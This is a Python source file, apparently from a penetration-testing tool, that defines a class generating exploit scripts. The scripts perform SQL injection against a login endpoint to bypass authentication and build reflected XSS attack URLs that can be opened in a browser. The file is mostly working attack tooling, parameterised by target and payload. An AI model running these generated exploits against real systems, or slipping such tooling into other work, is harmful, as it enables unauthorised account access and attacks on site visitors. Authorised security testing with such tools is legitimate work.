import os

class PoCGenerator:
    def __init__(self, output_dir="exploits"):
        self.output_dir = output_dir
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

    def generate_sqli_poc(self, target_url, payload, method="POST", params=None):
        """
        Generates a Python script to reproduce SQL Injection.
        """
        filename = f"exploit_sqli_{int(os.urandom(4).hex(), 16)}.py"
        path = os.path.join(self.output_dir, filename)
        
        content = f"""import requests
import sys

# SQL Injection Exploit
# Target: {target_url}
# Payload: {payload}

def exploit():
    url = "{target_url}"
    payload = "{payload}"
    
    print(f"[*] Attacking {{url}} with payload: {{payload}}")
    
    try:
        # Replicating the successful request
        if "{method}" == "POST":
            # Assuming standard login params based on findings
            # You might need to adjust 'username'/'password' keys manually if they differ
            data = {{
                "username": payload,
                "password": "password"
            }}
            res = requests.post(url, data=data, timeout=10)
        else:
            res = requests.get(url, params={params} if {params} else {{}}, timeout=10)
            
        print(f"[*] Response Code: {{res.status_code}}")
        if res.status_code == 200 and "Welcome" in res.text or "Logout" in res.text: 
             print("[+] Exploitation SUCCESS! Logged in.")
        else:
             print("[-] Exploitation might have failed. Check response manually.")
             print(res.text[:200])
             
    except Exception as e:
        print(f"[!] Error: {{e}}")

if __name__ == "__main__":
    exploit()
"""
        with open(path, "w") as f:
            f.write(content)
        return path

    def generate_xss_poc(self, target_url, param, payload):
        """
        Generates a Python script to print the XSS link.
        """
        filename = f"exploit_xss_{int(os.urandom(4).hex(), 16)}.py"
        path = os.path.join(self.output_dir, filename)
        
        # Construct the full URL
        if "?" in target_url:
             attack_url = target_url.replace(f"{param}=", f"{param}={payload}") # Simple replacement
        else:
             attack_url = f"{target_url}?{param}={payload}"

        content = f"""import webbrowser
import urllib.parse

# Reflected XSS Exploit
# Target: {target_url}
# Param: {param}
# Payload: {payload}

def exploit():
    target = "{target_url}"
    param = "{param}"
    payload = "{payload}"
    
    print("[*] Generating XSS Link...")
    
    # Simple construction (or use the pre-built one if simple)
    # Ideally should properly encode, but for PoC distinctness we show raw sometimes.
    # Here we construct it safely.
    
    params = {{param: payload}}
    query_string = urllib.parse.urlencode(params)
    
    if "?" in target:
        full_url = target + "&" + query_string
    else:
        full_url = target + "?" + query_string
        
    print(f"[+] Attack URL: {{full_url}}")
    
    choice = input("[?] Open in browser? (y/n): ")
    if choice.lower() == 'y':
        webbrowser.open(full_url)

if __name__ == "__main__":
    exploit()
"""
        with open(path, "w") as f:
            f.write(content)
        return path
